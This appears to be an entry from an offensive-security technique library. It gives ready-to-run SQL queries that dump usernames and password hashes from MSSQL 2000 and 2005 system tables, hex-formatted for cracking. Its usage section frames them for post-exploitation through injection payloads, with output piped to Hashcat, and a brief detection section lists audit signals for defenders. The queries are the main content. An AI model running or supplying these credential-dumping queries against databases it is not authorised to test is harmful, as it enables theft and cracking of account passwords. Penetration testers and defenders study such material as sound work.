---
type: code
language: sql
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mssql
  - hash-extraction
validated: true
---

# MSSQL-Password-Hash-Extraction-SQL-Queries

## Code

```sql
-- MSSQL 2000
SELECT name, password FROM master..sysxlogins;
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins; -- Convert to hex; may require error message capture in some tools.

-- MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins;
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
```

## Description

This SQL code snippet contains queries to extract usernames and password hashes from MSSQL system tables for versions 2000 and 2005. It includes both raw binary dumps and hex-converted formats for cracking compatibility.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Fixed queries; no variables | N/A |

## Usage

Execute these queries via sqlcmd, SQL Server Management Studio, or injection payloads after gaining database access. Use hex versions to directly pipe output to a file for Hashcat. Ideal in post-exploitation phases targeting legacy MSSQL instances.

## Detection

- Audit logs showing SELECT on master..sysxlogins or master.sys.sql_logins.
- Anomalous hex conversion function calls (fn_varbintohexstr).
- Increased query volume from unknown IPs.

## Related

- [[procedures/MSSQL-Server-Password-Hash-Extraction-and-Cracking]]
